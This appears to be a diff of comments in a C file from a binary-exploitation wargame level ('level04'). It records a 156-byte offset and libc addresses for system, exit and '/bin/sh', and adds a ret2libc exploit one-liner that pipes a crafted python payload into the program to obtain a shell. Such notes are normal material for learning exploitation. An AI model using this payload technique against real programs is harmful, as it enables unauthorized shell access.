@@ -84,5 +84,7 @@ int	main(void)
 // 156 diff
 
 // 0xf7e6aed0 system
-// 0xf7f897ec exit
-// 0xf7e5eb70 /bin/sh
+// 0xf7e5eb70 exit
+// 0xf7f897ec /bin/sh
+
+// (python -c "print '\x90'*156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'"; cat) | ./level04
